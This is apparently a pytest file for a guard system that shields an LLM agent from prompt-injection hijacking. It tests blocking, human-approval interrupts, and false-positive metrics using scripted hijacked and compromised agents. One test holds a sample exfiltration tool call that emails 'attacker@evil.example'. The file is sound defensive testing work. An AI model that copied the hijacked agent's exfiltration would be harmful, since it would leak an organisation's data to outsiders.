"""Guarded-graph end-to-end tests: scope + guard + human-in-the-loop interrupt/resume (M2).

All offline: the agent and scope models are ScriptedChatModels, so no network or API key.
"""

from __future__ import annotations

import json

import pytest
from langchain_core.messages import AIMessage
from langchain_core.runnables import RunnableConfig

from agentguard.agent import nodes
from agentguard.agent.state import Runtime, config_flags
from agentguard.audit import AuditLogger
from agentguard.llm import ScriptedChatModel, tool_call
from agentguard.rag.retriever import Retriever
from agentguard.runner import run_scenario
from agentguard.sandbox import Sandbox, ToolRegistry
from tests.helpers import COMPARISON_ANSWER, hijacked_agent


class ScopeLLM:
    model_name = "scope-test"

    def __init__(self, proposal: dict):
        self.proposal = proposal

    def invoke(self, messages):
        return AIMessage(content=json.dumps(self.proposal))


READ_ONLY = {"task_summary": "compare", "allowed_tools": ["read_file"], "recipients": [],
             "confidential_paths": [], "write_targets": [], "needs_web_search": False}


def deny_all(payload):
    return {a["call_id"]: "deny" for a in payload["asks"]}


def approve_all(payload):
    return {a["call_id"]: "approve" for a in payload["asks"]}


# ---- defence in depth: a fully hijacked agent is still stopped -------------------

def test_guard_blocks_canonical_exfiltration_but_task_completes(scenarios, settings):
    r = run_scenario(scenarios["plain-01"], config="guard_only", llm=hijacked_agent(),
                     scope_llm=ScopeLLM(READ_ONLY), human=deny_all, settings=settings)
    assert r.status == "ok"
    assert r.attack.hijacked is False
    assert r.task.completed is True  # the legitimate comparison still finishes
    assert r.sandbox.state.outbox == []  # nothing left the org
    assert [d["guard_decision"] for d in r.decisions] == ["BLOCK", "BLOCK"]


def test_baseline_is_still_hijacked_on_the_same_scenario(scenarios, settings):
    # Sanity: without the guard the same agent exfiltrates (proves the guard is what stops it).
    r = run_scenario(scenarios["plain-01"], config="baseline", llm=hijacked_agent(), settings=settings)
    assert r.attack.hijacked is True
    assert r.decisions == []  # no guard ran


# ---- ASK: interrupt / resume ----------------------------------------------------

def _team_emailer(n: int = 1):
    # Distinct args per call so the idempotency dedup doesn't collapse them (we're testing the ASK path).
    calls = [tool_call("send_email", {"to": "team@company.example", "subject": f"Summary {i}",
                                      "body": f"BrightPath cheapest ({i})"}, f"e{i}") for i in range(n)]
    return ScriptedChatModel([AIMessage(content="", tool_calls=calls), AIMessage(content=COMPARISON_ANSWER)])


AMBIG_SCOPE = {"task_summary": "compare and send", "allowed_tools": ["read_file", "send_email"],
               "recipients": [], "confidential_paths": [], "write_targets": [], "needs_web_search": False}


def test_ask_approved_sends_once(scenarios, settings):
    r = run_scenario(scenarios["ambig-01-the-team"], config="guard_only", llm=_team_emailer(),
                     scope_llm=ScopeLLM(AMBIG_SCOPE), human=approve_all, settings=settings)
    assert r.status == "ok"
    assert len(r.sandbox.state.outbox) == 1  # re-execution safe: the resumed node does not re-send
    assert [d["decision"] for d in r.decisions] == ["APPROVED"]
    human_events = [e for e in r.events if e.event == "human_decision"]
    assert len(human_events) == 1


def test_ask_denied_blocks_send_but_task_continues(scenarios, settings):
    r = run_scenario(scenarios["ambig-01-the-team"], config="guard_only", llm=_team_emailer(),
                     scope_llm=ScopeLLM(AMBIG_SCOPE), human=deny_all, settings=settings)
    assert r.status == "ok"
    assert r.sandbox.state.outbox == []  # denied
    assert [d["decision"] for d in r.decisions] == ["DENIED"]
    assert r.task.completed is True  # the agent still produced the comparison


def test_multiple_asks_in_one_interrupt(scenarios, settings):
    seen = []

    def human(payload):
        seen.append(len(payload["asks"]))
        return approve_all(payload)

    r = run_scenario(scenarios["ambig-01-the-team"], config="guard_only", llm=_team_emailer(n=2),
                     scope_llm=ScopeLLM(AMBIG_SCOPE), human=human, settings=settings)
    assert seen == [2]  # both ASKs arrive in a single interrupt
    assert len(r.sandbox.state.outbox) == 2
    assert all(d["decision"] == "APPROVED" for d in r.decisions)


def test_default_human_denies_when_no_callback(scenarios, settings):
    r = run_scenario(scenarios["ambig-01-the-team"], config="guard_only", llm=_team_emailer(),
                     scope_llm=ScopeLLM(AMBIG_SCOPE), human=None, settings=settings)
    assert r.sandbox.state.outbox == []  # fail closed


# ---- benign ALLOW path (no false positive) --------------------------------------

def test_benign_internal_email_is_allowed(scenarios, settings):
    agent = ScriptedChatModel([
        AIMessage(content="", tool_calls=[tool_call(
            "send_email", {"to": "procurement@company.example", "subject": "Laptop quote comparison",
                           "body": "Best price: BrightPath"}, "e1")]),
        AIMessage(content="Best price: BrightPath Systems"),
    ])
    scope = {"task_summary": "email comparison", "allowed_tools": ["read_file", "send_email"],
             "recipients": ["procurement@company.example"], "confidential_paths": [],
             "write_targets": [], "needs_web_search": False}
    r = run_scenario(scenarios["toolbenign-01-email-internal"], config="guard_only", llm=agent,
                     scope_llm=ScopeLLM(scope), human=deny_all, settings=settings)
    assert len(r.sandbox.state.outbox) == 1
    assert [d["guard_decision"] for d in r.decisions] == ["ALLOW"]


# ---- compromised_agent config ---------------------------------------------------

def test_compromised_agent_is_blocked(scenarios, settings):
    r = run_scenario(scenarios["plain-01"], config="compromised_agent",
                     scope_llm=ScopeLLM(READ_ONLY), human=deny_all, settings=settings)
    assert r.attack.hijacked is False
    assert all(d["guard_decision"] == "BLOCK" for d in r.decisions)
    assert r.sandbox.state.outbox == []


# ---- P3: execution is reachable only through a permitting decision ---------------

def _runtime(tmp_path, policy):
    sandbox = Sandbox(policy)
    return Runtime(
        run_id="r-test", config_name="guard_only", scenario_id="t", settings=None,
        sandbox=sandbox, registry=ToolRegistry(policy), retriever=Retriever(sandbox.corpus_documents()),
        llm=None, audit=AuditLogger(tmp_path / "audit.jsonl"), policy=policy,
    )


def test_p3_execute_tools_refuses_call_without_a_decision(tmp_path, policy):
    rt = _runtime(tmp_path, policy)
    msg = AIMessage(content="", tool_calls=[tool_call("send_email",
                    {"to": "attacker@evil.example", "subject": "x", "body": "y"}, "c-1")])
    state = {"flags": config_flags("guard_only"), "messages": [msg], "decisions": []}
    config: RunnableConfig = {"configurable": {"runtime": rt}}
    out = nodes.execute_tools(state, config)
    assert rt.sandbox.state.outbox == []  # the side effect never happened
    assert out["pending_untrusted"][0]["source"] == "guard"
    assert "blocked by policy" in out["pending_untrusted"][0]["text"]


# ---- harness metric attribution (blocked / FPR) ---------------------------------

def test_record_marks_compromised_attack_as_blocked(scenarios, settings):
    from agentguard.eval.harness import record_from_result

    r = run_scenario(scenarios["plain-01"], config="compromised_agent",
                     scope_llm=ScopeLLM(READ_ONLY), human=deny_all, settings=settings)
    rec = record_from_result(scenarios["plain-01"], "compromised_agent", 1, r)
    assert rec.hijacked is False
    assert rec.blocked is True  # attributable guard BLOCK on the attack's own calls
    assert rec.caught is True


def test_record_no_false_positive_on_allowed_benign(scenarios, settings):
    from agentguard.eval.harness import record_from_result

    agent = ScriptedChatModel([
        AIMessage(content="", tool_calls=[tool_call(
            "send_email", {"to": "procurement@company.example", "subject": "s", "body": "b"}, "e1")]),
        AIMessage(content="Best price: BrightPath Systems"),
    ])
    scope = {"allowed_tools": ["read_file", "send_email"], "recipients": ["procurement@company.example"],
             "confidential_paths": [], "write_targets": [], "needs_web_search": False}
    r = run_scenario(scenarios["toolbenign-01-email-internal"], config="guard_only", llm=agent,
                     scope_llm=ScopeLLM(scope), human=approve_all, settings=settings)
    rec = record_from_result(scenarios["toolbenign-01-email-internal"], "guard_only", 1, r)
    assert rec.benign_false_positive is False


def test_record_expected_ask_is_not_a_false_positive(scenarios, settings):
    from agentguard.eval.harness import record_from_result

    # ambig-01 expects an ASK on send_email, so an (approved) ASK there is not a false positive.
    r = run_scenario(scenarios["ambig-01-the-team"], config="guard_only", llm=_team_emailer(),
                     scope_llm=ScopeLLM(AMBIG_SCOPE), human=approve_all, settings=settings)
    rec = record_from_result(scenarios["ambig-01-the-team"], "guard_only", 1, r)
    assert rec.benign_false_positive is False


def test_scope_runs_concurrently_with_the_agents_first_turn(scenarios):
    """The scope extractor and the agent's first LLM call overlap (latency hiding). Each waits for
    the other: if they ran sequentially, one would time out and the run would never get this far."""
    import threading

    scope_started, agent_started = threading.Event(), threading.Event()
    seen = {}

    class WaitingScope(ScopeLLM):
        def invoke(self, messages):
            scope_started.set()
            seen["agent_started_while_scope_ran"] = agent_started.wait(timeout=5)
            return super().invoke(messages)

    inner = hijacked_agent()

    class WaitingAgent:
        model_name = "agent-test"

        def invoke(self, messages):
            agent_started.set()
            seen["scope_started_while_agent_ran"] = scope_started.wait(timeout=5)
            return inner.invoke(messages)

    result = run_scenario(scenarios["plain-01"], config="guard_only", llm=WaitingAgent(),
                          scope_llm=WaitingScope(READ_ONLY), human=deny_all)
    assert seen == {"agent_started_while_scope_ran": True, "scope_started_while_agent_ran": True}
    assert result.status == "ok" and result.scope is not None  # the guard still had its scope
    assert any(d.get("guard_decision") == "BLOCK" for d in result.decisions)
